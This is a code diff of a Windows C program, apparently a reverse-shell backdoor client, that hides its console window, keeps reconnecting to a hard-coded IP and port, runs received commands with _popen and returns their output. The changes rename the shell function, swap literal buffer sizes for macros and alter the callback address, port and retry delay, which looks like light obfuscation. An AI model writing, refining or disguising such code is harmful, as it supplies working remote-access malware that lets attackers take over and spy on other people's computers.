@@ -11,6 +11,8 @@
 #include <sys/types.h>
 
 #define bzero(p, size) (void) memset((p), 0, (size))
+#define bsz 1024
+#define wsz 18384
 
 /*
     i686-w64-mingw32-gcc -o win_client.exe win_client.c -lwsock32 -lwininet
@@ -18,17 +20,17 @@
 
 int sock;
 
-void Shell() {
-    char buffer[1024];
-    char container[1024];
-    char total_response[18384];
+void Shll() {
+    char buffer[bsz];
+    char container[bsz];
+    char total_response[wsz];
 
     while (1) {
         jump:
-        bzero(buffer, 1024);
+        bzero(buffer, bsz);
         bzero(container, sizeof(container));
         bzero(total_response, sizeof(total_response));
-        recv(sock, buffer, 1024, 0);
+        recv(sock, buffer, bsz, 0);
 
         if (strncmp("q", buffer, 1) == 0) {
             closesocket(sock);
@@ -37,7 +39,7 @@ void Shell() {
         } else {
             FILE *fp;
             fp = _popen(buffer, "r");
-            while (fgets(container, 1024, fp) != NULL) {
+            while (fgets(container, bsz, fp) != NULL) {
                 strcat(total_response, container);
             }
             send(sock, total_response, sizeof(total_response), 0);
@@ -51,7 +53,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
-
     ShowWindow(stealth, 0);
 
     struct sockaddr_in ServAddr;
@@ -59,8 +60,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     char *ServIP;
     WSADATA wsaData;
 
-    ServIP = "192.168.1.199";
-    ServPort = 9999;
+    ServIP = "192.168.1.100";
+    ServPort = 8080;
 
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
         exit(1);
@@ -75,8 +76,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
     start:
     while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
-        sleep(30);
+        sleep(40);
         goto start;
     }
-    Shell();
+    Shll();
 } 
